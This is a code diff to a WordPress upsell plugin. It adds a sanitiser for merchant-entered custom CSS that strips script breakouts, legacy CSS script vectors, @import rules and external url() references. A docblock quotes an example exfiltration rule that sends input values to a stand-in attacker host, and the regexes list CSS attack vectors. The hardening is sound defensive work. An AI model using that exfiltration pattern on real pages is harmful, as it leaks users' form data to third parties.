@@ -1486,11 +1486,16 @@ if ( ! class_exists( 'WFOCU_AJAX_Controller' ) ) {
 			$options['ttl_funnel']                 = sanitize_text_field( $options['ttl_funnel'] );
 			$options['scripts']                    = self::sanitize_global_script( wp_unslash( $options['scripts'] ) );
 			$options['scripts_head']               = self::sanitize_global_script( wp_unslash( $options['scripts_head'] ) );
-			$options['offer_header_text']          = wp_unslash( $options['offer_header_text'] );
-			$options['offer_yes_btn_text']         = wp_unslash( $options['offer_yes_btn_text'] );
-			$options['offer_skip_link_text']       = wp_unslash( $options['offer_skip_link_text'] );
-			$options['offer_header_text']          = wp_unslash( $options['offer_header_text'] );
-			$options['cart_opener_text']           = wp_unslash( $options['cart_opener_text'] );
+			// CSS box uses the CSS sanitiser (never the script sanitiser, which strips valid CSS);
+			// isset-guarded because the form may omit the key.
+			if ( isset( $options['custom_css'] ) ) {
+				$options['custom_css'] = self::sanitize_global_css( wp_unslash( $options['custom_css'] ) );
+			}
+			$options['offer_header_text']    = wp_unslash( $options['offer_header_text'] );
+			$options['offer_yes_btn_text']   = wp_unslash( $options['offer_yes_btn_text'] );
+			$options['offer_skip_link_text'] = wp_unslash( $options['offer_skip_link_text'] );
+			$options['offer_header_text']    = wp_unslash( $options['offer_header_text'] );
+			$options['cart_opener_text']     = wp_unslash( $options['cart_opener_text'] );
 
 			$options = WFOCU_Common::maybe_filter_boolean_strings( $options );
 
@@ -1638,6 +1643,110 @@ if ( ! class_exists( 'WFOCU_AJAX_Controller' ) ) {
 			}
 
 			return $script;
+		}
+
+		/**
+		 * Sanitises merchant-supplied global CSS before storing or printing it.
+		 *
+		 * Strips only the CSS-context vectors (expression(), -moz-binding, url(javascript:…),
+		 * behavior: declarations and tag breakouts) while preserving legitimate declarations —
+		 * NEVER route CSS through sanitize_global_script(), which mangles valid CSS. Prefers
+		 * WFFN_Common::sanitize_global_css() as the single source of truth when funnel-builder
+		 * is active, falling back to a self-contained copy of the same routine so the upsell
+		 * plugin behaves correctly on its own.
+		 *
+		 * @since {VERSION}
+		 *
+		 * @param string $css Raw CSS entered by the merchant.
+		 *
+		 * @return string Sanitised CSS, unwrapped (caller adds the <style> wrapper).
+		 */
+		public static function sanitize_global_css( $css ) {
+			// Prefer the shared funnel-builder implementation when available (single source of
+			// truth), guarded so a missing class/method can never fatal.
+			if ( class_exists( 'WFFN_Common' ) && method_exists( 'WFFN_Common', 'sanitize_global_css' ) ) {
+				$css = WFFN_Common::sanitize_global_css( $css );
+			} else {
+				if ( ! is_string( $css ) || '' === $css ) {
+					return '';
+				}
+
+				// Unwrap, don't delete, <style> wrappers a merchant may have pasted around their CSS —
+				// strip only the literal tags and keep the declarations inside.
+				$css = preg_replace( '#</?\s*style\b[^>]*>#i', '', $css );
+
+				// Remove only tag openers (`<` followed by a letter, `!` or `/`) so a `</style><script>…`
+				// breakout is neutralized without eating `>` child combinators or a literal `<` in a value.
+				$css = preg_replace( '#<\s*(?=[a-z!/])#i', '', $css );
+
+				// Legacy CSS-context vectors, scoped so they never touch selector/identifier names.
+				$css = preg_replace( '/expression\s*\(/i', '', $css );   // IE expression().
+				$css = preg_replace( '/-moz-binding\s*:/i', '', $css );  // XBL binding.
+
+				// Strip javascript:/vbscript: only when used as a protocol inside url( … ) — a bare
+				// `javascript:` elsewhere in CSS is inert, and stripping it globally mangled selectors.
+				$css = preg_replace_callback(
+					'#url\(\s*([\'"]?)(.*?)\1\s*\)#is',
+					static function ( $matches ) {
+						$clean = preg_replace( '/(?:javascript|vbscript)\s*:/i', '', $matches[2] );
+						if ( $clean === $matches[2] ) {
+							return $matches[0]; // No dangerous protocol — keep the url() token byte-identical.
+						}
+
+						return 'url(' . $matches[1] . $clean . $matches[1] . ')';
+					},
+					$css
+				);
+
+				// `behavior:` only as a declaration (start of file, or after `;`/`{`), never inside a
+				// selector such as `.behavior:hover`.
+				$css = preg_replace( '/(^|[;{]\s*)behavior\s*:/i', '$1', $css );
+			}
+
+			// WFOCU-side hardening applied to BOTH the WFFN_Common result and the fallback: close
+			// the CSS data-exfiltration vectors (@import / external url()) that neither upstream
+			// routine strips. Kept inside the upsell plugin per card scope.
+			return self::strip_css_exfil_vectors( $css );
+		}
+
+		/**
+		 * Strips CSS-context data-exfiltration vectors that the base sanitisers leave intact:
+		 * `@import` at-rules (can pull in a remote stylesheet) and `url()` references to an
+		 * external origin (the transport for attribute-selector exfiltration on offer/checkout
+		 * pages, e.g. `input[value^="a"]{background:url(https://evil.example/a)}`). Same-site
+		 * relative paths and `data:` URIs cannot reach a third party and are preserved so
+		 * legitimate same-site background images / fonts keep working.
+		 *
+		 * @since {VERSION}
+		 *
+		 * @param string $css Already base-sanitised CSS.
+		 *
+		 * @return string
+		 */
+		private static function strip_css_exfil_vectors( $css ) {
+			if ( ! is_string( $css ) || '' === $css ) {
+				return '';
+			}
+
+			// Remove @import at-rules entirely (both `@import url(...)` and `@import "..."` forms),
+			// up to the terminating `;`. No legitimate use inside an inline offer-page CSS box.
+			$css = preg_replace( '/@import\b[^;]*;?/i', '', $css );
+
+			// Drop url() tokens whose target is an external absolute origin — http(s):// or
+			// protocol-relative //. Relative paths and data: URIs are preserved.
+			$css = preg_replace_callback(
+				'#url\(\s*([\'"]?)([^\'")]*)\1\s*\)#is',
+				static function ( $m ) {
+					if ( preg_match( '#^\s*(?:https?:)?//#i', $m[2] ) ) {
+						return ''; // External reference — remove the whole url() token.
+					}
+
+					return $m[0]; // Same-site / data: — keep byte-identical.
+				},
+				$css
+			);
+
+			return $css;
 		}
 
 		public static function preview_details() {
@@ -2497,6 +2606,7 @@ if ( ! class_exists( 'WFOCU_AJAX_Controller' ) ) {
 				if ( ! empty( $events ) ) {
 
 					$events = json_decode( wp_kses_stripslashes( $events ), true );
+					WFOCU_Core()->ecom_tracking->conv_api_event_url = isset( $_POST['event_url'] ) && is_string( $_POST['event_url'] ) ? sanitize_url( wp_unslash( $_POST['event_url'] ) ) : '';
 					WFOCU_Core()->ecom_tracking->maybe_render_conv_api( $events, true );
 				}
 			} catch ( Exception | error $e ) {
